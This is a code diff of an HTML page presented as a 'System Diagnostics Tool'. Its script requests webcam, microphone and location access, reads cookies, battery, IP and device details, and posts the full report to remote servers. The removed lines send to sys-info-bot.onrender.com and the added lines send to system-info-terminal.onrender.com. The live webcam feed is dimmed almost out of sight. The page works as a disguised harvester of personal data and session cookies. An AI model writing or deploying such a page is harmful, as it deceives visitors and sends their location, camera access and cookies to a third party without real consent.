@@ -2,67 +2,82 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>System Diagnostics</title>
+
+  <!-- Google font for tech look -->
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet" />
+
   <style>
+    :root {
+      --matrix-green: #00ff7b;
+      --bg-green-dim: #003c1c;
+    }
+    * { margin: 0; padding: 0; box-sizing:border-box; }
+
     body {
-      background-color: #000;
-      color: #00FF00;
-      font-family: 'Courier New', Courier, monospace;
-      padding: 20px;
+      background:#000;
+      color:var(--matrix-green);
+      font-family:'Share Tech Mono',monospace;
+      min-height:100vh;
+      display:flex;
+      flex-direction:column;
+      align-items:center;
+      padding:2rem 1rem;
     }
     h2 {
-      text-align: center;
-      color: #00FF00;
-      margin-bottom: 20px;
-    }
-    #infoBox {
-      display: none;
-      border: 1px solid #00FF00;
-      padding: 20px;
-      margin-top: 20px;
+      font-size:2rem;
+      margin-bottom:1.5rem;
+      text-shadow:0 0 10px var(--matrix-green);
+      text-align:center;
     }
     button {
-      background-color: transparent;
-      color: #00FF00;
-      border: 1px solid #00FF00;
-      padding: 10px 20px;
-      font-family: inherit;
-      cursor: pointer;
-      display: block;
-      margin: 0 auto;
+      background:transparent;
+      color:var(--matrix-green);
+      border:1px solid  var(--matrix-green);
+      padding:.6rem 1.4rem;
+      font:inherit;
+      cursor:pointer;
+      transition:.25s;
     }
-    button:hover {
-      background-color: #003300;
+    button:hover{ background:var(--bg-green-dim); }
+
+    #infoBox{
+      width:100%;
+      max-width:760px;
+      border:1px solid var(--matrix-green);
+      padding:1.3rem 1.6rem;
+      margin-top:1.5rem;
+      display:none;
+      overflow-y:auto;
+      background:rgba(0,0,0,.85);
+      box-shadow:0 0 15px var(--matrix-green);
     }
-    .label {
-      font-weight: bold;
-      color: #00FF00;
+    .label{ font-weight:bold; }
+    p{ margin:.35rem 0; }
+
+    #webcamFeed{
+      width:100%;
+      max-height:200px;
+      border:1px solid var(--matrix-green);
+      display:none;
+      margin-bottom:1rem;
+      object-fit:cover;
+      filter:grayscale(100%);
+      opacity:.12;
     }
-    p {
-      margin: 5px 0;
-    }
-    video {
-      width: 300px;
-      height: auto;
-      display: none;
-      border: 1px solid #00FF00;
-      margin-bottom: 15px;
-    }
-    #errorMsg {
-      color: red;
-      text-align: center;
-      margin-top: 10px;
-    }
+    #errorMsg{ color:#f33; text-align:center; margin-top:.8rem;}
   </style>
 </head>
 <body>
-  <h2>System Diagnostics Tool</h2>
+  <h2>🧠 System Diagnostics Tool</h2>
+
   <p id="errorMsg"></p>
   <button id="accessBtn" onclick="getAllInfo()">Run Diagnostics</button>
 
   <div id="infoBox">
-    <video id="webcamFeed" autoplay></video>
+    <video id="webcamFeed" autoplay muted></video>
+
     <p><span class="label">IP Address:</span> <span id="ipAddress"></span></p>
     <p><span class="label">Location:</span> <span id="location"></span></p>
     <p><span class="label">Webcam:</span> <span id="webcamResult"></span></p>
@@ -80,278 +95,79 @@
   </div>
 
   <script>
-    document.addEventListener('DOMContentLoaded', () => {
-      async function getAllInfo() {
-        const errorMsg = document.getElementById('errorMsg');
-        errorMsg.textContent = '';
-        document.getElementById('accessBtn').style.display = 'none';
-        document.getElementById('infoBox').style.display = 'block';
+    async function getAllInfo() {
+      const $ = id => document.getElementById(id);
 
-        let info = {
-          webcam: 'Denied',
-          microphone: 'Denied',
-          location: 'Denied',
-          ip: 'Unknown',
-          browser: navigator.userAgent,
-          resolution: `${window.screen.width}x${window.screen.height}`,
-          depth: `${window.screen.colorDepth}-bit`,
-          os: navigator.platform,
-          lang: navigator.language,
-          online: navigator.onLine ? 'Online' : 'Offline',
-          connection: 'Unknown',
-          battery: 'Unknown',
-          charging: 'Unknown',
-          cookies: document.cookie || 'No cookies'
-        };
+      $("errorMsg").textContent = "";
+      $("accessBtn").style.display = "none";
+      $("infoBox").style.display = "block";
 
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-          document.getElementById('webcamFeed').srcObject = stream;
-          document.getElementById('webcamFeed').style.display = 'block';
-          info.webcam = 'Granted';
-          info.microphone = 'Granted';
-          document.getElementById('webcamResult').textContent = 'Accessible';
-          document.getElementById('microphoneResult').textContent = 'Accessible';
-        } catch {
-          document.getElementById('webcamResult').textContent = 'Unavailable';
-          document.getElementById('microphoneResult').textContent = 'Unavailable';
+      const info = {
+        webcam : "Denied",
+        microphone : "Denied",
+        location : "Denied",
+        ip : "Unknown",
+        browser : navigator.userAgent,
+        resolution : `${screen.width}x${screen.height}`,
+        depth : `${screen.colorDepth}-bit`,
+        os : navigator.platform,
+        lang : navigator.language,
+        online : navigator.onLine ? "Online" : "Offline",
+        connection : "Unknown",
+        battery : "Unknown",
+        charging : "Unknown",
+        cookies : document.cookie || "No cookies"
+      };
+
+      /* permissions ----------------------------------------------------*/
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video:true, audio:true });
+        $("webcamFeed").srcObject = stream;
+        $("webcamFeed").style.display = "block";
+        info.webcam = info.microphone = "Accessible";
+      } catch { /* ignore */ }
+
+      try {
+        const pos = await new Promise((res, rej)=>navigator.geolocation.getCurrentPosition(res, rej));
+        info.location = `Lat: ${pos.coords.latitude.toFixed(4)}, Long: ${pos.coords.longitude.toFixed(4)}`;
+      } catch { /* location denied */ }
+
+      /* other data ----------------------------------------------------*/
+      $("browser").textContent     = info.browser;
+      $("resolution").textContent  = info.resolution;
+      $("depth").textContent       = info.depth;
+      $("os").textContent          = info.os;
+      $("lang").textContent        = info.lang;
+      $("status").textContent      = info.online;
+      $("cookies").textContent     = info.cookies;
+      $("webcamResult").textContent= info.webcam;
+      $("microphoneResult").textContent = info.microphone;
+      $("location").textContent    = info.location;
+
+      try {
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (conn) {
+          info.connection = conn.effectiveType;
+          $("connection").textContent = info.connection;
         }
+      } catch {}
 
-        try {
-          const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
-          info.location = `Lat: ${pos.coords.latitude.toFixed(4)}, Long: ${pos.coords.longitude.toFixed(4)}`;
-          document.getElementById('location').textContent = info.location;
-        } catch {
-          document.getElementById('location').textContent = 'Unavailable';
-          errorMsg.textContent = 'Some access was restricted.';
-        }
+      try {
+        const bat = await navigator.getBattery();
+        info.battery  = `${Math.round(bat.level * 100)}%`;
+        info.charging = bat.charging ? "Yes":"No";
+        $("battery").textContent  = info.battery;
+        $("charging").textContent = info.charging;
+      } catch {}
 
-        document.getElementById('browser').textContent = info.browser;
-        document.getElementById('resolution').textContent = info.resolution;
-        document.getElementById('depth').textContent = info.depth;
-        document.getElementById('os').textContent = info.os;
-        document.getElementById('lang').textContent = info.lang;
-        document.getElementById('status').textContent = info.online;
-        document.getElementById('cookies').textContent = info.cookies;
+      try {
+        const ip = await fetch("https://api.ipify.org?format=json").then(r=>r.json());
+        info.ip = ip.ip;
+        $("ipAddress").textContent = info.ip;
+      } catch {}
 
-        try {
-          const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-          info.connection = conn ? conn.effectiveType : 'Unknown';
-          document.getElementById('connection').textContent = info.connection;
-        } catch {}
-
-        try {
-          const battery = await navigator.getBattery();
-          info.battery = `${Math.round(battery.level * 100)}%`;
-          info.charging = battery.charging ? 'Yes' : 'No';
-          document.getElementById('battery').textContent = info.battery;
-          document.getElementById('charging').textContent = info.charging;
-        } catch {}
-
-        try {
-          const ipRes = await fetch('https://api.ipify.org?format=json');
-          const ipData = await ipRes.json();
-          info.ip = ipData.ip;
-          document.getElementById('ipAddress').textContent = info.ip;
-        } catch (err) {
-          console.error('IP fetch failed:', err);
-        }
-
-        const message = `
-🔍 System Report:
-
-IP: ${info.ip}
-Location: ${info.location}
-Webcam: ${info.webcam}
-Mic: ${info.microphone}
-Browser: ${info.browser}
-Resolution: ${info.resolution}
-Color Depth: ${info.depth}
-OS: ${info.os}
-Language: ${info.lang}
-Network: ${info.connection}
-Battery: ${info.battery}
-Charging: ${info.charging}
-Cookies: ${info.cookies}
-Online: ${info.online}
-        `;
-       //https://system-info-terminal.onrender.com
-        try {
-          await fetch('https://sys-info-bot.onrender.com/send-message', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ message })
-          });
-        } catch (err) {
-          console.error('Failed to send info:', err);
-        }
-      }
-
-      window.getAllInfo = getAllInfo;
-    });
-  </script>
-</body>
-</html>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>System Diagnostics</title>
-  <style>
-    body {
-      background-color: #000;
-      color: #00FF00;
-      font-family: 'Courier New', Courier, monospace;
-      padding: 20px;
-    }
-    h2 {
-      text-align: center;
-      color: #00FF00;
-      margin-bottom: 20px;
-    }
-    #infoBox {
-      display: none;
-      border: 1px solid #00FF00;
-      padding: 20px;
-      margin-top: 20px;
-    }
-    button {
-      background-color: transparent;
-      color: #00FF00;
-      border: 1px solid #00FF00;
-      padding: 10px 20px;
-      font-family: inherit;
-      cursor: pointer;
-      display: block;
-      margin: 0 auto;
-    }
-    button:hover {
-      background-color: #003300;
-    }
-    .label {
-      font-weight: bold;
-      color: #00FF00;
-    }
-    p {
-      margin: 5px 0;
-    }
-    video {
-      width: 300px;
-      height: auto;
-      display: none;
-      border: 1px solid #00FF00;
-      margin-bottom: 15px;
-    }
-    #errorMsg {
-      color: red;
-      text-align: center;
-      margin-top: 10px;
-    }
-  </style>
-</head>
-<body>
-  <h2>System Diagnostics Tool</h2>
-  <p id="errorMsg"></p>
-  <button id="accessBtn" onclick="getAllInfo()">Run Diagnostics</button>
-
-  <div id="infoBox">
-    <video id="webcamFeed" autoplay></video>
-    <p><span class="label">IP Address:</span> <span id="ipAddress"></span></p>
-    <p><span class="label">Location:</span> <span id="location"></span></p>
-    <p><span class="label">Webcam:</span> <span id="webcamResult"></span></p>
-    <p><span class="label">Microphone:</span> <span id="microphoneResult"></span></p>
-    <p><span class="label">Browser:</span> <span id="browser"></span></p>
-    <p><span class="label">Resolution:</span> <span id="resolution"></span></p>
-    <p><span class="label">Color Depth:</span> <span id="depth"></span></p>
-    <p><span class="label">Operating System:</span> <span id="os"></span></p>
-    <p><span class="label">Language:</span> <span id="lang"></span></p>
-    <p><span class="label">Network:</span> <span id="connection"></span></p>
-    <p><span class="label">Battery Level:</span> <span id="battery"></span></p>
-    <p><span class="label">Charging:</span> <span id="charging"></span></p>
-    <p><span class="label">Cookies:</span> <span id="cookies"></span></p>
-    <p><span class="label">Online Status:</span> <span id="status"></span></p>
-  </div>
-
-  <script>
-    document.addEventListener('DOMContentLoaded', () => {
-      async function getAllInfo() {
-        const errorMsg = document.getElementById('errorMsg');
-        errorMsg.textContent = '';
-        document.getElementById('accessBtn').style.display = 'none';
-        document.getElementById('infoBox').style.display = 'block';
-
-        let info = {
-          webcam: 'Denied',
-          microphone: 'Denied',
-          location: 'Denied',
-          ip: 'Unknown',
-          browser: navigator.userAgent,
-          resolution: `${window.screen.width}x${window.screen.height}`,
-          depth: `${window.screen.colorDepth}-bit`,
-          os: navigator.platform,
-          lang: navigator.language,
-          online: navigator.onLine ? 'Online' : 'Offline',
-          connection: 'Unknown',
-          battery: 'Unknown',
-          charging: 'Unknown',
-          cookies: document.cookie || 'No cookies'
-        };
-
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-          document.getElementById('webcamFeed').srcObject = stream;
-          document.getElementById('webcamFeed').style.display = 'block';
-          info.webcam = 'Granted';
-          info.microphone = 'Granted';
-          document.getElementById('webcamResult').textContent = 'Accessible';
-          document.getElementById('microphoneResult').textContent = 'Accessible';
-        } catch {
-          document.getElementById('webcamResult').textContent = 'Unavailable';
-          document.getElementById('microphoneResult').textContent = 'Unavailable';
-        }
-
-        try {
-          const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
-          info.location = `Lat: ${pos.coords.latitude.toFixed(4)}, Long: ${pos.coords.longitude.toFixed(4)}`;
-          document.getElementById('location').textContent = info.location;
-        } catch {
-          document.getElementById('location').textContent = 'Unavailable';
-          errorMsg.textContent = 'Some access was restricted.';
-        }
-
-        document.getElementById('browser').textContent = info.browser;
-        document.getElementById('resolution').textContent = info.resolution;
-        document.getElementById('depth').textContent = info.depth;
-        document.getElementById('os').textContent = info.os;
-        document.getElementById('lang').textContent = info.lang;
-        document.getElementById('status').textContent = info.online;
-        document.getElementById('cookies').textContent = info.cookies;
-
-        try {
-          const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-          info.connection = conn ? conn.effectiveType : 'Unknown';
-          document.getElementById('connection').textContent = info.connection;
-        } catch {}
-
-        try {
-          const battery = await navigator.getBattery();
-          info.battery = `${Math.round(battery.level * 100)}%`;
-          info.charging = battery.charging ? 'Yes' : 'No';
-          document.getElementById('battery').textContent = info.battery;
-          document.getElementById('charging').textContent = info.charging;
-        } catch {}
-
-        try {
-          const ipRes = await fetch('https://api.ipify.org?format=json');
-          const ipData = await ipRes.json();
-          info.ip = ipData.ip;
-          document.getElementById('ipAddress').textContent = info.ip;
-        } catch (err) {
-          console.error('IP fetch failed:', err);
-        }
-
-        const message = `
+      /* send to backend -----------------------------------------------*/
+      const message = `
 🔍 System Report:
 
 🧠 IP Address: ${info.ip}
@@ -368,21 +184,19 @@ Online: ${info.online}
 ⚡ Charging: ${info.charging}
 🍪 Cookies: ${info.cookies}
 🔌 Online: ${info.online}
-        `;
+      `;
 
-        try {
-          await fetch('http://localhost:3000/send-message', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ message })
-          });
-        } catch (err) {
-          console.error('Failed to send info:', err);
-        }
+      try {
+        await fetch('https://system-info-terminal.onrender.com/send-message', {   // <- your Render URL
+          method : 'POST',
+          headers: { 'Content-Type':'application/json' },
+          body   : JSON.stringify({ message })
+        });
+      } catch (e) {
+        console.error("Failed to send info:", e);
+        $("errorMsg").textContent = "Could not contact reporting server.";
       }
-
-      window.getAllInfo = getAllInfo;
-    });
+    }
   </script>
 </body>
 </html>
